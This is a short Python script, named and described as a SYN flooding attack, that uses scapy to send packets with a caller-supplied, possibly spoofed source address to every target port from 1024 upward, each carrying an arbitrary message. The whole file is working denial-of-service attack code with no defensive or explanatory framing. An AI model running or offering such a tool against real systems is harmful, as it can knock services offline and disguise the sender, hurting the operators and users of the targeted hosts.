#!/usr/bin/env python3
"""
syn_flooding.py: SYN Flooding attack

"""

import scapy.all as scapy

def syn_flood(source_ip, target_ip, message):
	""" SYN Flooding attack """

	for dport in range(1024, 65535):
		# SYN packet
		ip_layer = scapy.IP(src=source_ip, dst=target_ip)
		tcp_layer = scapy.TCP(sport=4444, dport=dport)

		packet = ip_layer / tcp_layer

		# Message
		raw_layer = scapy.Raw()
		packet = packet / raw_layer

		# Set message
		packet.load = message

		# Send packet
		scapy.send(packet, verbose=False)